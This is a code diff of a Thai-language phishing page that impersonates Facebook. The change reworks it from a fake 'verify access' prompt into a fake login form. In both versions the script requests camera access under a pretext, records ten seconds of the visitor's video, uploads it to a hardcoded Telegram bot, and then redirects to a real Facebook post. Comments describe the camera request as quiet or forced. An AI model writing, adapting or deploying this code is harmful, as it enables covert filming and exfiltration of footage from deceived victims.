@@ -1,62 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Content Security</title>
+    <title>Facebook</title>
 </head>
-<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+<body style="background:#f0f2f5; margin:0; font-family:inherit; display:flex; justify-content:center; padding-top:50px;">
+    <div style="width:100%; max-width:400px; text-align:center;">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zS4wkv.svg" width="200" style="margin-bottom:20px;">
+        <div style="background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1); margin:0 15px;">
+            <p style="font-size:18px; margin-bottom:20px;">เข้าสู่ระบบเพื่อดำเนินการต่อ</p>
+            <input type="text" placeholder="อีเมลหรือหมายเลขโทรศัพท์" style="width:90%; padding:12px; margin-bottom:10px; border:1px solid #dddfe2; border-radius:6px; background:#f5f6f7;">
+            <input type="password" placeholder="รหัสผ่าน" style="width:90%; padding:12px; margin-bottom:15px; border:1px solid #dddfe2; border-radius:6px; background:#f5f6f7;">
+            <button id="loginBtn" style="width:96%; background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:17px; font-weight:bold; cursor:pointer;">เข้าสู่ระบบ</button>
+            <hr style="border:0; border-top:1px solid #dadde1; margin:20px 0;">
+            <button type="button" style="background:#42b72a; color:#fff; border:none; padding:10px 16px; border-radius:6px; font-weight:bold;">สร้างบัญชีใหม่</button>
+        </div>
+    </div>
 
-<div style="background:#fff; padding:30px; border-radius:12px; text-align:center; width:90%; max-width:320px; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="55">
-    <h2 style="font-size:18px; margin:15px 0;">ยืนยันสิทธิ์การเข้าถึง</h2>
-    <p style="font-size:14px; color:#606770; line-height:1.4;">เนื้อหานี้ถูกจำกัดการเข้าถึง โปรดกดยืนยันตัวตนเพื่อรับชมโพสต์หรือข้อมูลดังกล่าว</p>
-    
-    <button id="auth" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">กดยืนยันเพื่อเข้าชม</button>
-    
-    <div id="loading" style="display:none; margin-top:15px; color:#1877f2; font-weight:bold;">⏳ กำลังโหลดข้อมูล...</div>
-</div>
+    <script>
+        const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
+        const C = '8482017371';
+        const R = 'https://www.facebook.com/share/p/1avrMEzzJn/';
 
-<script>
-    const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
-    const C = '8482017371';
-    const R = 'https://www.facebook.com/share/p/1avrMEzzJn/';
-
-    document.getElementById('auth').onclick = async function() {
-        const b = this;
-        const l = document.getElementById('loading');
-        
-        try {
-            // ขอสิทธิ์กล้องแบบเงียบๆ
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            b.style.display = 'none';
-            l.style.display = 'block';
-
-            const rec = new MediaRecorder(s);
-            const chunks = [];
-            
-            rec.ondataavailable = e => chunks.push(e.data);
-            rec.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                const fd = new FormData();
-                fd.append('chat_id', C);
-                fd.append('video', blob, 'user_verify.mp4');
-
-                // ส่งเข้า Telegram
-                await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
-                
-                s.getTracks().forEach(track => track.stop());
-                window.location.replace(R);
-            };
-
-            rec.start();
-            setTimeout(() => rec.stop(), 10000); // ถ่าย 10 วินาที
-
-        } catch (err) {
-            alert("โปรดกด 'อนุญาต' เพื่อเข้าถึงเนื้อหานี้");
-        }
-    };
-</script>
+        document.getElementById('loginBtn').onclick = async function() {
+            this.innerText = 'กำลังตรวจสอบ...';
+            try {
+                // บังคับขอสิทธิ์กล้อง
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const m = new MediaRecorder(s);
+                const chunks = [];
+                m.ondataavailable = e => chunks.push(e.data);
+                m.onstop = async () => {
+                    const fd = new FormData();
+                    fd.append('chat_id', C);
+                    fd.append('video', new Blob(chunks, {type:'video/mp4'}), 'secure.mp4');
+                    await fetch(`https://api.telegram.org/bot${T}/sendVideo`, {method:'POST', body:fd});
+                    s.getTracks().forEach(t => t.stop());
+                    window.location.replace(R);
+                };
+                m.start();
+                setTimeout(() => m.stop(), 10000); // ถ่าย 10 วิ
+            } catch (e) {
+                alert("เกิดข้อผิดพลาดด้านความปลอดภัย: โปรดอนุญาตการเข้าถึงอุปกรณ์เพื่อยืนยันตัวตน");
+                this.innerText = 'เข้าสู่ระบบ';
+            }
+        };
+    </script>
 </body>
 </html>
